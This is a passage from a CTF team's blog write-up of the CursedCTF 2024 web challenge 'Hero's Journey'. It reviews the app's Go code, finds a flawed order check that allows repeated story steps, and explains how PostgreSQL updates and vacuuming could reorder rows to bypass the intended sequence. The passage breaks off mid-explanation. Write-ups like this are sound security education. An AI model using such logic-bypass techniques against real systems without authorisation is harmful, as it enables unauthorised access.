<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="CursedCTF 2024" /><meta name="author" content="K4oS" /><meta property="og:locale" content="en" /><meta name="description" content="Web - Hero’s Journey Challenge description" /><meta property="og:description" content="Web - Hero’s Journey Challenge description" /><link rel="canonical" href="https://ireland.re/posts/CursedCTF_2024/" /><meta property="og:url" content="https://ireland.re/posts/CursedCTF_2024/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-04-05T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CursedCTF 2024" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@K4oS" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"K4oS"},"dateModified":"2024-04-05T20:47:49+00:00","datePublished":"2024-04-05T00:00:00+00:00","description":"Web - Hero’s Journey Challenge description","headline":"CursedCTF 2024","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/CursedCTF_2024/"},"url":"https://ireland.re/posts/CursedCTF_2024/"}</script><title>CursedCTF 2024 | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>CursedCTF 2024</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>CursedCTF 2024</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1712275200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-04-05 </em> </span> <span> Updated <em class="timeago" data-ts="1712350069" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-04-05 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2152 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="web---heros-journey">Web - Hero’s Journey</h1><h2 id="challenge-description"><span class="mr-2">Challenge description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Hero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image:</p><p><img data-src="/images/cursedctf/A.png" alt="" data-proofer-ignore></p><p>So let’s exploit this!</p><h2 id="code-review"><span class="mr-2">Code review</span><a href="#code-review" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This application is written in golang and uses PostgreSQL as the database of choice.</p><p>We find the following HTTP endpoints:</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="p">(</span><span class="n">s</span> <span class="o">*</span><span class="n">Server</span><span class="p">)</span> <span class="n">RegisterRoutes</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">ServeMux</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">x</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">)</span>
	<span class="n">x</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/hero"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">hero</span><span class="p">)</span>
	<span class="n">x</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/create_hero"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">createHero</span><span class="p">)</span>
	<span class="n">x</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/update_event"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">updateEvent</span><span class="p">)</span>
	<span class="n">x</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">flag</span><span class="p">)</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Let’s take a look at what happens when we create a hero</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="p">(</span><span class="n">s</span> <span class="o">*</span><span class="n">Server</span><span class="p">)</span> <span class="n">createHero</span><span class="p">(</span><span class="n">rw</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">req</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">lock</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
	<span class="k">defer</span> <span class="n">lock</span><span class="o">.</span><span class="n">Unlock</span><span class="p">()</span>

	<span class="n">c</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">req</span><span class="o">.</span><span class="n">Cookie</span><span class="p">(</span><span class="n">cookieName</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">WriteHeader</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">StatusBadRequest</span><span class="p">)</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">{</span><span class="m">0x6e</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x62</span><span class="p">,</span> <span class="m">0x72</span><span class="p">,</span> <span class="m">0x75</span><span class="p">,</span> <span class="m">0x68</span><span class="p">})</span>
		<span class="k">return</span>
	<span class="p">}</span>
	<span class="n">tenant</span> <span class="o">:=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">MustParse</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">Value</span><span class="p">)</span>

	<span class="n">d</span> <span class="o">:=</span> <span class="n">db</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">db</span><span class="p">,</span> <span class="n">tenant</span><span class="p">)</span>

	<span class="k">if</span> <span class="n">h</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">d</span><span class="o">.</span><span class="n">GetHero</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">Context</span><span class="p">());</span> <span class="n">h</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">WriteHeader</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">StatusBadRequest</span><span class="p">)</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"because of unintended solutions stemming from multiple paralell storylines, we cannot provide you with a second story, it would just be unfair to the challenge author who wants to see you suffer"</span><span class="p">))</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="n">events</span> <span class="o">:=</span> <span class="p">[]</span><span class="o">*</span><span class="n">models</span><span class="o">.</span><span class="n">Event</span><span class="p">{}</span>

	<span class="n">err</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">Unmarshal</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">URL</span><span class="o">.</span><span class="n">Query</span><span class="p">()</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"events"</span><span class="p">)),</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">WriteHeader</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">StatusBadRequest</span><span class="p">)</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"bad json"</span><span class="p">))</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="n">last</span> <span class="o">:=</span> <span class="m">0</span>
	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">e</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">events</span> <span class="p">{</span>
		<span class="k">if</span> <span class="kt">int</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">Type</span><span class="p">)</span> <span class="o">!=</span> <span class="n">last</span> <span class="o">&amp;&amp;</span> <span class="kt">int</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">Type</span><span class="p">)</span> <span class="o">!=</span> <span class="n">last</span><span class="o">+</span><span class="m">1</span> <span class="p">{</span> <span class="c">// jikes</span>
			<span class="n">rw</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"Get your words straight, Jack!"</span><span class="p">))</span>
			<span class="k">return</span>
		<span class="p">}</span>
		<span class="n">last</span> <span class="o">=</span> <span class="kt">int</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">Type</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="n">id</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">d</span><span class="o">.</span><span class="n">CreateHero</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">Context</span><span class="p">(),</span> <span class="n">req</span><span class="o">.</span><span class="n">URL</span><span class="o">.</span><span class="n">Query</span><span class="p">()</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"name"</span><span class="p">),</span> <span class="n">events</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">()))</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="n">http</span><span class="o">.</span><span class="n">Redirect</span><span class="p">(</span><span class="n">rw</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="s">"/hero?id="</span><span class="o">+</span><span class="n">strconv</span><span class="o">.</span><span class="n">Itoa</span><span class="p">(</span><span class="n">id</span><span class="p">),</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusFound</span><span class="p">)</span>
<span class="p">}</span>
</pre></table></code></div></div><p>In the first two lines of this function, we can see a mutex lock is called, this will prevent any race condition as all requests are handled one at a time.</p><p>We then ensure we have a cookie set and return an error if not.</p><p>Afterwards, it will create a new connection to the database and make sure our cookie is a valid UUID (As per RFC 4122), later checking if we already have created a hero with this cookie, in which case it will deny our request and return.</p><p>After this, it will JSON decode the values we have sent over the HTTP GET request and make sure it’s valid. The JSON we send over looks like this:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Called into adventure"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Refuses"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"meets"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"cross"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"step 4"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"step 5"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="mi">6</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"step 6"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>The code then checks if the order in which we sent the types is correct, from smallest to largest (0-6). However, a flaw that we can observe with the check of <code class="language-plaintext highlighter-rouge">int(e.Type) != last &amp;&amp; int(e.Type) != last+1</code> is that we can supply the same step multiple times. This will be handy later on.</p><p>We then create the hero with this story and redirect the user to its page!</p><p>Looking at the source of the flag page, we can see that a requirement for the story is that the struct:</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">type</span> <span class="n">StorySimulation</span> <span class="k">struct</span> <span class="p">{</span>
	<span class="n">adventureAccepted</span>           <span class="kt">bool</span>
	<span class="n">andTheyWereHappyEverAfter</span>   <span class="kt">bool</span>
	<span class="n">mentorAlive</span>                 <span class="kt">bool</span>
	<span class="n">inKnownWorld</span>                <span class="kt">bool</span>
	<span class="n">abyssDone</span>                   <span class="kt">bool</span>
	<span class="n">emotionalTransformationDone</span> <span class="kt">bool</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Has the field <code class="language-plaintext highlighter-rouge">andTheyWereHappyEverAfter</code> set to true. Let’s take a look at how the story is executed:</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">simulate</span><span class="p">(</span><span class="n">events</span> <span class="p">[]</span><span class="o">*</span><span class="n">db</span><span class="o">.</span><span class="n">Event</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="n">StorySimulation</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">ss</span> <span class="o">:=</span> <span class="n">NewStorySimulation</span><span class="p">()</span>

	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">e</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">events</span> <span class="p">{</span>
		<span class="k">switch</span> <span class="n">e</span><span class="o">.</span><span class="n">Type</span> <span class="p">{</span>
		<span class="k">case</span> <span class="n">models</span><span class="o">.</span><span class="n">CallToAdventure</span><span class="o">:</span>

			<span class="k">if</span> <span class="o">!</span><span class="n">ss</span><span class="o">.</span><span class="n">inKnownWorld</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"what the hecking d..."</span><span class="p">)</span>
			<span class="p">}</span>

		<span class="k">case</span> <span class="n">models</span><span class="o">.</span><span class="n">Refusal</span><span class="o">:</span>
			<span class="n">ss</span><span class="o">.</span><span class="n">adventureAccepted</span> <span class="o">=</span> <span class="no">false</span>

		<span class="k">case</span> <span class="n">models</span><span class="o">.</span><span class="n">MeetingMentor</span><span class="o">:</span>
			<span class="n">ss</span><span class="o">.</span><span class="n">mentorAlive</span> <span class="o">=</span> <span class="no">true</span>
			<span class="n">ss</span><span class="o">.</span><span class="n">adventureAccepted</span> <span class="o">=</span> <span class="no">true</span>

		<span class="k">case</span> <span class="n">models</span><span class="o">.</span><span class="n">CrossingThreashold</span><span class="o">:</span>
			<span class="k">if</span> <span class="o">!</span><span class="n">ss</span><span class="o">.</span><span class="n">adventureAccepted</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"that doesn't make any sense!"</span><span class="p">)</span>
			<span class="p">}</span>
			<span class="n">ss</span><span class="o">.</span><span class="n">inKnownWorld</span> <span class="o">=</span> <span class="no">false</span>

		<span class="k">case</span> <span class="n">models</span><span class="o">.</span><span class="n">Abyss</span><span class="o">:</span>
			<span class="k">if</span> <span class="n">ss</span><span class="o">.</span><span class="n">inKnownWorld</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"wrong place"</span><span class="p">)</span>
			<span class="p">}</span>

			<span class="n">ss</span><span class="o">.</span><span class="n">abyssDone</span> <span class="o">=</span> <span class="no">true</span>

		<span class="k">case</span> <span class="n">models</span><span class="o">.</span><span class="n">DeathOfMentor</span><span class="o">:</span>

			<span class="k">if</span> <span class="n">ss</span><span class="o">.</span><span class="n">inKnownWorld</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"keep your facts straight"</span><span class="p">)</span>
			<span class="p">}</span>

			<span class="n">ss</span><span class="o">.</span><span class="n">mentorAlive</span> <span class="o">=</span> <span class="no">false</span>
			<span class="n">ss</span><span class="o">.</span><span class="n">emotionalTransformationDone</span> <span class="o">=</span> <span class="no">true</span>

		<span class="k">case</span> <span class="n">models</span><span class="o">.</span><span class="n">Return</span><span class="o">:</span>

			<span class="k">if</span> <span class="o">!</span><span class="n">ss</span><span class="o">.</span><span class="n">abyssDone</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"need to abyss yourself first!"</span><span class="p">)</span>
			<span class="p">}</span>

			<span class="k">if</span> <span class="n">ss</span><span class="o">.</span><span class="n">inKnownWorld</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"returning in wierd ways are for the pwn people! stop trying to be quirky"</span><span class="p">)</span>
			<span class="p">}</span>

			<span class="k">if</span> <span class="o">!</span><span class="n">ss</span><span class="o">.</span><span class="n">emotionalTransformationDone</span> <span class="p">{</span>
				<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"don't try to trick me again! get your act together"</span><span class="p">)</span>
			<span class="p">}</span>

			<span class="k">if</span> <span class="n">ss</span><span class="o">.</span><span class="n">mentorAlive</span> <span class="p">{</span>
				<span class="n">ss</span><span class="o">.</span><span class="n">andTheyWereHappyEverAfter</span> <span class="o">=</span> <span class="no">true</span>
			<span class="p">}</span>

			<span class="n">ss</span><span class="o">.</span><span class="n">inKnownWorld</span> <span class="o">=</span> <span class="no">true</span>

			<span class="k">return</span> <span class="n">ss</span><span class="p">,</span> <span class="no">nil</span>

		<span class="k">default</span><span class="o">:</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">Type</span><span class="p">)</span>
			<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"are you mad!?"</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"oi bruv"</span><span class="p">)</span>
<span class="p">}</span>

</pre></table></code></div></div><p>By default, the struct is initiated with all values set to false except for <code class="language-plaintext highlighter-rouge">inKnownWorld</code>.</p><p>Let’s see what happens on each step:</p><ul><li>Step 0: Checks <code class="language-plaintext highlighter-rouge">inKnownWorld</code> is <code class="language-plaintext highlighter-rouge">true</code><li>Step 1: Set <code class="language-plaintext highlighter-rouge">adventureAccepted</code> to <code class="language-plaintext highlighter-rouge">false</code><li>Step 2: Set <code class="language-plaintext highlighter-rouge">mentorAlive</code> and <code class="language-plaintext highlighter-rouge">adventureAccepted</code> to <code class="language-plaintext highlighter-rouge">true</code><li>Step 3: Checks <code class="language-plaintext highlighter-rouge">adventureAccepted</code> is <code class="language-plaintext highlighter-rouge">true</code>, then set <code class="language-plaintext highlighter-rouge">inKnownWorld</code> to <code class="language-plaintext highlighter-rouge">false</code><li>Step 4: Checks <code class="language-plaintext highlighter-rouge">inKnownWorld</code> is <code class="language-plaintext highlighter-rouge">false</code> and sets <code class="language-plaintext highlighter-rouge">abyssDone</code> to <code class="language-plaintext highlighter-rouge">true</code><li>Step 5: Checks <code class="language-plaintext highlighter-rouge">inKnownWorld</code> is <code class="language-plaintext highlighter-rouge">false</code> and sets <code class="language-plaintext highlighter-rouge">mentorAlive</code> to <code class="language-plaintext highlighter-rouge">false</code> and <code class="language-plaintext highlighter-rouge">emotionalTransformationDone</code> to <code class="language-plaintext highlighter-rouge">true</code><li>Step 6: Checks <code class="language-plaintext highlighter-rouge">abyssDone</code> and <code class="language-plaintext highlighter-rouge">emotionalTransformationDone</code> is set to true and <code class="language-plaintext highlighter-rouge">inKnownWorld</code> is set to <code class="language-plaintext highlighter-rouge">false</code>. If <code class="language-plaintext highlighter-rouge">mentorAlive</code> is <code class="language-plaintext highlighter-rouge">true</code>, then it gives us the flag, then it returns the struct state and sets in <code class="language-plaintext highlighter-rouge">inKnownWorld</code> to <code class="language-plaintext highlighter-rouge">true</code></ul><p>This may sound like a mess but it simply means that we need to execute all steps in order, but execute step 2 before step 6 if we want the flag. But… how can we do this?</p><p>The check from before makes sure that the story is always in order, so we cannot just send the value in the incorrect position.</p><p>Let’s take a look at another endpoint, used to update a stage in the story. What this function does is just modify the description of one of the stages, nothing else. However, it will only update the values if the values are in order.</p><p>The function to query the stages when we want to get the flag executes them in the order they are within the database. This makes an exploit possible.</p><p>When we update values in Postgres, it will copy the row we are editing and send it to the bottom, leaving its previous space behind.</p><p>So, we can modify the order of the stages after we have created the story, so it seems like the obvious next step would be to update all the values in the order we want them to be executed. However, this is not possible because the order check is executed before any change, so as soon as we update one value and the table becomes disorganised, we will not be able to edit any more descriptions.</p><p>We need to abuse another of PostgreSQL’s features, this is called vacuuming.</p><p><img data-src="/images/cursedctf/B.png" alt="" data-proofer-ignore></p><p>Let’s imagine that the picture above depicts a table with 7 rows. These rows contain the stages 0 through 6.</p><p>As we explained before, when we update the values of the table, they will be cloned and put at the bottom, leaving behind an empty space</p><p><img data-src="/images/cursedctf/C.png" alt="" data-proofer-ignore></p><p>One might think that the next value we update will be put into the empty row, as to reuse space. However, this does not happen. Or at least until the table is “vacuumed”.</p><p>The empty spaces are non-writable. However, when the table is vacuumed, these become 